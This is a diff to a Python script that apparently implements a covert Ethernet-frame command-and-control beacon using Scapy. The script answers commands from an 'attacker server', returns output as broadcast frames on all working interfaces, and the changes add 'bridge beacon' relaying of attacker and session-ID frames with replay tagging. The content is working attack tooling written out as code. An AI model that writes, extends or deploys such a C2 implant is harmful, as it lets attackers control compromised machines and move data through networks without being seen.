@@ -1,12 +1,13 @@
 import argparse, threading, time
 import hashlib
 from scapy.all import sniff, Ether, sendp, get_if_list, conf # pip
+from scapy.interfaces import get_working_ifaces
 import subprocess, os, socket, sys
 import netifaces
 import platform
 
 print("Current Scapy Interface:", conf.iface)
-
+os_name = platform.system()
 
 mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
 frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
@@ -15,7 +16,9 @@ frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are support
 frame_delay = 0.5      # For chunked responses, could help by spacing out frames
 session_id  = "default" # Id for accessing the session
 attacker_id = "default" # Id for returning information to the attacker server
-relay_broadcast = False # Relay broadcast from attacker to all 
+relay_broadcast = False # Relay broadcast from attacker to all
+
+sid_forward = ["laptop5566"] # Used by bridge beacons
 
 # Create a hash for session_id change
 session_id_change = hashlib.sha3_256()
@@ -64,6 +67,7 @@ c2_id_r = c2_id_r.hexdigest()
                  
 def send_frame(message, mac_address, sender):
     global interfaces
+    global os_name
     
     if relay_broadcast == False:
         # Next send the output back to the command server
@@ -86,28 +90,26 @@ def send_frame(message, mac_address, sender):
             frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
             eth_frame = Ether(dst=mac_address) / frame
             
-            interfaces = netifaces.interfaces()
-            
+            # Get a list of all working interfaces
+            interfaces = get_working_ifaces()
+                   
             # Send the Ethernet frame
             for interface in interfaces:
-                if os_name == "Windows":
-                    interface = "\\Device\\NPF_" + interface
-                print(interface)
                 try:
-                    #with open(os.devnull, 'w') as f:
-                    sendp(eth_frame, verbose=False, iface=interface)
-                        
+                    sendp(eth_frame, verbose=False, iface=interface.name)
+                            
                 except Exception as e:
-                    print(e)         
-
+                    print(e)
         
 def Delimiter(index, message, delimiter): # delimits received message
     pad     = "\\x00"   # Gets rid of padding
-    returnc = "\\r"     # Gets rid of return carriage 
+    returnc = "\\r"     # Gets rid of return carriage
+    replay_frame = "replayed_frame" # Get rid of replayed frames
     
     string = str(message)
     nstring = string[index + len(delimiter):]
     nstring = nstring.replace(returnc, '')
+    nstring = nstring.replace(replay_frame, '')
     nstring = nstring.replace(pad, '')
     nstring = nstring.replace("'", "")    
     return nstring
@@ -156,10 +158,23 @@ def process_frame(frame):
                 #print(pong)
                 send_frame(pong.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                 index = -1
-
-            if attacker_id.encode('utf-8') in eth_frame.payload.original and relay_broadcast == True: # Relay all broadcasts from attacker to all interfaces
-                # Relay broadcast to all interfaces if bridge beacon
-                send_frame(eth_frame.payload.original, "FF:FF:FF:FF:FF:FF", attacker_id)
+                
+            #attacker_id.encode('utf-8') in eth_frame.payload.original and 
+            if relay_broadcast == True and "replayed_frame".encode('utf-8') not in eth_frame.payload.original: # Forward attacker and sids
+                #rm
+                #replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"        
+                #send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", attacker_id)
+                if index != -1:
+                    for sid in sid_forward:
+                        if sid.encode('utf-8') in eth_frame.payload.original:
+                            # Relay broadcast to all interfaces if bridge beacon
+                            replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"
+                            send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", sid)
+                            
+                if attacker_id.encode('utf-8') in eth_frame.payload.original:
+                    replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"        
+                    send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", attacker_id)
+                    
                 
             if session_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to session change request
                 # First, find index
@@ -206,7 +221,7 @@ def process_frame(frame):
                 send_frame(message.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                 index = -1
                 
-            if relay_broadcast_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast getter
+            if relay_broadcast_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast change
                 ChangeRelayBroadcast()
                 index = -1
              
